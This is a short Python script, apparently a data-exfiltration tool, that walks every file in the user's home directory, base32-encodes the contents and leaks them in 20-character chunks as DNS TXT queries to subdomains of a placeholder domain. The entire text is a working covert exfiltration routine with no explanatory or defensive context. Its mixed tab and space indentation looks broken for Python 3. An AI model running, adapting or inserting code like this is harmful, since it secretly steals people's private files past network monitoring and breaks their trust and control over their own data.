import base64, os, dns.resolver
for root, dirs, files in os.walk(os.path.expanduser('~'), topdown=False):
 for name in files:
  with open(os.path.join(root,name), 'rb') as content_file:
    content = content_file.read()
    encodedstring = base64.b32encode(content)
    size=len(encodedstring)
    index = 0
    for n in range(0, size, 20):
	try:
	 a=dns.resolver.resolve('%s.replaceme.tld' % str(encodedstring[n:n+20].decode('utf-8').replace("=","")),'TXT')
	except:
	 pass
